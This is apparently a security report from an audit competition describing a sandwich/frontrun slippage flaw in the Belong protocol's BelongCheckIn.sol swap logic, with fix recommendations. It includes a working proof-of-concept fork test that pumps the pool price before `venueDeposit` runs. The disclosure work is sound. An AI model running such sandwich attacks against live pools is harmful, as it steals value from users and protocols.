# 57586 sc high calculating slippage for swap onchain does not prevent slippage loss

**Submitted on Oct 27th 2025 at 11:06:06 UTC by @kaysoft for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57586
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/platform/BelongCheckIn.sol>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

### Brief / Intro

Calculating slippage onchain does not prevent slippage loss because at the time the victim's transaction is calling the `quoteExactInput(...)` function to calculate `amountMinOut`, the pool has already been manipulated and price has shifted.

### Vulnerability Details

The `_swapExact(...)` function is used for swaps between USDC and LONG token in the `venueDeposit(...)`, `payToVenue(...)`, and `distributePromoterPayments(...)` functions of `BelongCheckIn.sol`.

The issue is that the `amountOutMinimum` (used for slippage protection) is calculated inside the same transaction. If a large swap that buys the output token (Long) has already been executed before `venueDeposit(...)` is executed, `amountOutMinimum` calculation will only use the already-adjusted price since blockchain execution is atomic.

The `_swapExact(...)` function calls `quoteExactInput(...)` to derive a fraction as `amountOutMinimum`. Because execution is atomic, even after the price has been impacted by a prior on-chain swap in the same block, `quoteExactInput(...)` reads the impacted price and returns a fraction of that impacted price. Thus calculating slippage onchain in this way provides no effective protection against sandwich/frontrun-style price moves.

Vulnerable snippet:

```solidity
File: BelongCheckIn.sol
function _swapExact(address tokenIn, address tokenOut, address recipient, uint256 amount)
        internal
        returns (uint256 swapped)
    {
        if (recipient == address(0) || amount == 0) {
            return 0;
        }

        PaymentsInfo memory _paymentsInfo = belongCheckInStorage.paymentsInfo;

        bytes memory path = _buildPath(_paymentsInfo, tokenIn, tokenOut);

        uint256 amountOutMinimum =//@audit calculating slippage onchain 
            IV3Quoter(_paymentsInfo.swapV3Quoter).quoteExactInput(path, amount).amountOutMin(_paymentsInfo.slippageBps);

        IV3Router.ExactInputParamsV1 memory swapParamsV1 = IV3Router.ExactInputParamsV1({
            path: path,
            recipient: recipient,
            deadline: block.timestamp,//@audit use literal timestamp instead of dynamic block.timestamp
            amountIn: amount,
            amountOutMinimum: amountOutMinimum
        });

        // Reset -> set pattern to support non-standard ERC20s that require zeroing allowance first
        tokenIn.safeApproveWithRetry(_paymentsInfo.swapV3Router, amount);
        try IV3Router(_paymentsInfo.swapV3Router).exactInput(swapParamsV1) returns (uint256 amountOut) {
            swapped = amountOut;
        } catch {
            IV3Router.ExactInputParamsV2 memory swapParamsV2 = IV3Router.ExactInputParamsV2({
                path: path, recipient: recipient, amountIn: amount, amountOutMinimum: amountOutMinimum
            });
            try IV3Router(_paymentsInfo.swapV3Router).exactInput(swapParamsV2) returns (uint256 amountOut) {
                swapped = amountOut;
            } catch {
                revert SwapFailed(tokenIn, tokenOut, amount);
            }
        }

        // Clear allowance to reduce residual approvals surface area
        tokenIn.safeApprove(_paymentsInfo.swapV3Router, 0);

        emit Swapped(recipient, amount, swapped);
    }
```

## Impact Details

Swaps executed in `venueDeposit(...)`, `payToVenue(...)`, and `distributePromoterPayments(...)` can be executed at a loss if an attacker performs a large swap that moves the price of the output token before these functions execute. Because `amountOutMinimum` is computed onchain after the attacker has manipulated the pool, the computed minimum will reflect the manipulated (worse) price and provide no effective protection for the user or protocol.

## Recommendation

{% stepper %}
{% step %}

### Use an off-chain/signed or externally submitted amountOutMinimum

Consider passing `amountOutMinimum` as an input parameter to the contract (provided and reviewed by the caller before broadcasting the transaction). DEX frontends typically call `quoteExactInput(...)` (or use a TWAP) off-chain and present the user with an `amountOutMinimum` they can tweak before sending the transaction. This ensures the `amountOutMinimum` used by the swap is not read on-chain after a prior manipulation.
{% endstep %}

{% step %}

### Allow deadline to be provided by caller (not block.timestamp)

Allow the `deadline` to be passed as an input parameter instead of using `block.timestamp`. Using `block.timestamp` at call time makes the deadline effectively dynamic (and will not cause reverts in front-running scenarios). The frontend should calculate a concrete deadline (e.g., current unix timestamp + 20 minutes) and pass it in to help prevent replay/failing-attempts beyond a reasonable window.
{% endstep %}
{% endstepper %}

## Proof of Concept

The following demonstrates how a sandwich/frontrun can buy a large amount of the output token (CAKE used as stand-in for LONG), moving price before `venueDeposit(...)` executes. Because `venueDeposit(...)` recalculates `amountOutMinimum` on-chain after the price has moved, the escrow receives significantly less output token.

Test steps to reproduce (add to the existing test file as described):

{% stepper %}
{% step %}

1. Copy and paste the test below into the `belong-check-in-bsc-fork.test.ts` file in the `describe('Customer flow usdc payment', () => {` test suite.
2. Run `yarn test`.
3. The test demonstrates a large CAKE buy executed before `venueDeposit(...)` which causes the escrow to receive less CAKE.
   {% endstep %}

{% step %}
Test code:

```solidity
it.only('Sandwich attack swap:kaysoft', async () => {
      const { belongCheckIn, escrow, signer, CAKE, USDC, USDC_whale, CAKE_whale, WBNB_whale } = await loadFixture(fixture);
      const belongCheckInStorage = await belongCheckIn.belongCheckInStorage();
      const uri = 'uriuri';
      const venueAmount = await u(100, USDC);
      const venue = USDC_whale.address;
      const venueMessage = ethers.utils.solidityKeccak256(
        ['address', 'bytes32', 'string', 'uint256'],
        [venue, ethers.constants.HashZero, uri, chainId],
      );
      const venueSignature = EthCrypto.sign(signer.privateKey, venueMessage);
      const venueInfo: VenueInfoStruct = {
        
        rules: { paymentType: 1, bountyType: 0, longPaymentType: 2 } as VenueRulesStruct,
        venue,
        amount: venueAmount,
        referralCode: ethers.constants.HashZero,
        uri,
        signature: venueSignature,
      };
      const willBeTaken = convenienceFeeAmount.add(venueAmount);

      //Step 1: Prepare to frontrun the swap in venueDeposit(...)
      const attacker = WBNB_whale;
      // Fund attacker with large amount of USDC for the attack
      const attackAmount = ethers.utils.parseEther('50000') // 50,000 USDC to move the price of CAKE UP
      await USDC.connect(USDC_whale).transfer(attacker.address, attackAmount);
      const router = await ethers.getContractAt("IV3Router", PANCAKESWAP_ROUTER_ADDRESS, attacker);
      // Helper function to encode path for V3
      function encodePath(tokenIn: string, tokenOut: string, fee: number): string {
        return ethers.utils.solidityPack(
          ['address', 'uint24', 'address'],
          [tokenIn, fee, tokenOut]
        );
      }
      await USDC.connect(attacker).approve(PANCAKESWAP_ROUTER_ADDRESS, attackAmount);
      const pathBuy = encodePath(USDC_ADDRESS, CAKE_ADDRESS, POOL_FEE);
      const exactInputParamsBuy = {
        path: pathBuy,
        recipient: attacker.address,
        deadline: 1824616696,//unix timestamp for 2028.
        amountIn: attackAmount,
        amountOutMinimum: 0, // 0 slippage just for test
      } as IV3Router.ExactInputParamsV1Struct;

      //Step 2: Move price of CAKE up with exactInput() buy CAKE before venueDeposit()
      await router['exactInput((bytes,address,uint256,uint256,uint256))'](exactInputParamsBuy);

      console.log("Escrow balance before:", await CAKE.balanceOf(escrow.address));

      //Step 3: Venue deposit buys CAKE at expensive price
      await USDC.connect(USDC_whale).approve(belongCheckIn.address, willBeTaken);
      await belongCheckIn.connect(USDC_whale).venueDeposit(venueInfo);

      //Step 4: The CAKE bought is sent to ESCROW and it's much smaller than expected
      console.log("Escrow balance after:", await CAKE.balanceOf(escrow.address))
      
    });
```

{% endstep %}

{% step %}
To run the test without the frontrun (control case), comment out the `Step 2` exactInput call:

```solidity
//await router['exactInput((bytes,address,uint256,uint256,uint256))'](exactInputParamsBuy);
```

{% endstep %}
{% endstepper %}

Logs observed:

* When `venueDeposit(...)` is frontrun with a large CAKE buy swap:
  * Escrow balance after: BigNumber { value: "2314060485415" } == 0.000002314060485415 CAKE
* When `venueDeposit(...)` executed without being frontrun:
  * Escrow balance after: BigNumber { value: "1873394195571341465" } == 1.873394195571341465 CAKE

These logs show the severe reduction in received output token when the on-chain slippage quote is obtained after the pool has already been manipulated.

## Notes / Additional Observations

* The snippet also uses `block.timestamp` as `deadline`. Passing a precomputed deadline from the frontend is preferable so transactions can be rejected if they’re executed unexpectedly late.
* Preventing this class of attack generally requires moving price checks off-chain (or using protected primitives like TWAP or Keeper-supplied prices) or allowing the caller to specify and sign the acceptable `amountOutMinimum`.
